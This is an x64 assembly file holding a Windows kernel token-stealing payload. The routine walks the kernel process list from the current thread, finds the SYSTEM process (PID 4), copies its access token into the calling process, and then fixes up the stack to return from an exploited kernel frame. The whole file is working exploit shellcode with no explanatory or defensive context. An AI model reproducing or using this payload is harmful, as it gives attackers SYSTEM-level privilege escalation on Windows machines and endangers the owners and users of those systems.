.code

token_stealing PROC
    push rax
    push rcx
    push rdx
    xor rax,rax
    mov rax,gs:[rax+188h]
    mov rax,[rax+0b8h]
    mov rcx,rax
    mov edx,4h
jmp_label:
    mov rax,[rax+448h]
    sub rax,448h
    cmp [rax+440h],rdx
    jnz jmp_label
    mov rdx,[rax+4b8h]
    mov [rcx+4b8h],rdx
    pop rdx
    pop rcx
    pop rax
    xor r12,r12
    add rsp,28h
    mov r15, [rsp+88h]
    ret
token_stealing ENDP

END
